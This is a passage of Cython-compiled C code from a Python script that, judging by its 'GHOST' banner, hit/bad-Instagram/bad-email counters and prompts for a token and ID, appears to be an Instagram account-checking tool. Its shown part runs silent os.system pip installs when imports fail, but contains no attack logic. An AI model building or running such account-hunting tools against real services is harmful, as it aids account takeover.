goto __pyx_L1_error;\n    __pyx_L83_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L87_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_5 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_hashlib, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 61, __pyx_L90_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_hashlib, __pyx_t_5) < (0)) __PYX_ERR(0, 61, __pyx_L90_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L95_try_end;\n    __pyx_L90_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 62, __pyx_L92_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_3);\n\n      \n      __pyx_t_10 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 63, __pyx_L92_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 63, __pyx_L92_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_mstate_global->__pyx_kp_u_pip_install_uuid};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 63, __pyx_L92_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      goto __pyx_L91_exception_handled;\n    }\n\n    \n    __pyx_L92_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L91_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L95_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_uuid, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L98_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_uuid, __pyx_t_3) < (0)) __PYX_ERR(0, 65, __pyx_L98_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L103_try_end;\n    __pyx_L98_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 66, __pyx_L100_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __pyx_t_9 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 67, __pyx_L100_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 67, __pyx_L100_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_mstate_global->__pyx_kp_u_pip_install_time};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L100_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L99_exception_handled;\n    }\n\n    \n    __pyx_L100_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L99_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L103_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_5 = __Pyx_PyList_Pack(2, __pyx_mstate_global->__pyx_n_u_Fore, __pyx_mstate_global->__pyx_n_u_Style); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_2 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_colorama, __pyx_t_5, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_Fore); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_Fore, __pyx_t_5) < (0)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_Style); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_Style, __pyx_t_5) < (0)) __PYX_ERR(0, 69, __pyx_L106_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L111_try_end;\n    __pyx_L106_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_5, &__pyx_t_3) < 0) __PYX_ERR(0, 70, __pyx_L108_except_error)\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n\n      \n      __pyx_t_11 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 71, __pyx_L108_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 71, __pyx_L108_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_mstate_global->__pyx_kp_u_pip_install_colorama};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 71, __pyx_L108_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      goto __pyx_L107_exception_handled;\n    }\n\n    \n    __pyx_L108_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L107_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L111_try_end:;\n  }\n\n  \n  __pyx_t_5 = NULL;\n  __Pyx_INCREF(__pyx_builtin_print);\n  __pyx_t_2 = __pyx_builtin_print; \n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_kp_u__14};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 73, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_render); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_4 = __Pyx_PyList_Pack(2, __pyx_mstate_global->__pyx_n_u_black, __pyx_mstate_global->__pyx_n_u_black); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n\n  \n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 5 : 0)] = {__pyx_t_2, __pyx_mstate_global->__pyx_n_u_GHOST};\n    __pyx_t_10 = __Pyx_MakeVectorcallBuilderKwds(5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 74, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_10);\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_font, __pyx_mstate_global->__pyx_n_u_block, __pyx_t_10, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_colors, __pyx_t_4, __pyx_t_10, __pyx_callargs+2, 1) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_align, __pyx_mstate_global->__pyx_n_u_center, __pyx_t_10, __pyx_callargs+2, 2) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_background, __pyx_mstate_global->__pyx_n_u_red, __pyx_t_10, __pyx_callargs+2, 3) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_space, Py_True, __pyx_t_10, __pyx_callargs+2, 4) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n    __pyx_t_3 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_10);\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_logo, __pyx_t_3) < (0)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_5 = NULL;\n  __Pyx_INCREF(__pyx_builtin_print);\n  __pyx_t_10 = __pyx_builtin_print; \n  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_logo); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 76, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_4};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_10 = NULL;\n  __Pyx_INCREF(__pyx_builtin_print);\n  __pyx_t_4 = __pyx_builtin_print; \n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_mstate_global->__pyx_kp_u__14};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 77, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_4 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_time); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 78, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_10);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_sleep); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 78, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_mstate_global->__pyx_int_1};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 78, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_total, __pyx_mstate_global->__pyx_int_0) < (0)) __PYX_ERR(0, 80, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_hits, __pyx_mstate_global->__pyx_int_0) < (0)) __PYX_ERR(0, 81, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_badinsta, __pyx_mstate_global->__pyx_int_0) < (0)) __PYX_ERR(0, 82, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_bademail, __pyx_mstate_global->__pyx_int_0) < (0)) __PYX_ERR(0, 83, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_goodig, __pyx_mstate_global->__pyx_int_0) < (0)) __PYX_ERR(0, 84, __pyx_L1_error)\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 85, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 85, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_mstate_global->__pyx_tuple[0], NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 85, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_b, __pyx_t_3) < (0)) __PYX_ERR(0, 85, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_b); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_12[0] = __pyx_mstate_global->__pyx_kp_u_38_5;\n  __pyx_t_12[1] = __pyx_t_5;\n  __pyx_t_12[2] = __pyx_mstate_global->__pyx_n_u_m;\n  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_12, 3, 7 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5) + 1, 127 | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5));\n  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_bo, __pyx_t_3) < (0)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_5 = NULL;\n  __Pyx_INCREF(__pyx_builtin_print);\n  __pyx_t_4 = __pyx_builtin_print; \n  __pyx_t_10 = __Pyx_PySequence_Multiply(__pyx_mstate_global->__pyx_kp_u_1_39m, 60); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 87, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_10);\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_10};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_4 = NULL;\n  __Pyx_INCREF(__pyx_builtin_input);\n  __pyx_t_10 = __pyx_builtin_input; \n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_mstate_global->__pyx_kp_u__15};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_Token, __pyx_t_3) < (0)) __PYX_ERR(0, 88, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_10 = NULL;\n  __Pyx_INCREF(__pyx_builtin_print);\n  __pyx_t_4 = __pyx_builtin_print; \n  __pyx_t_5 = __Pyx_PySequence_Multiply(__pyx_mstate_global->__pyx_kp_u_1_39m, 60); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 89, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_t_5};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_4 = NULL;\n  __Pyx_INCREF(__pyx_builtin_input);\n  __pyx_t_5 = __pyx_builtin_input; \n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_mstate_global->__pyx_kp_u__16};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_ID, 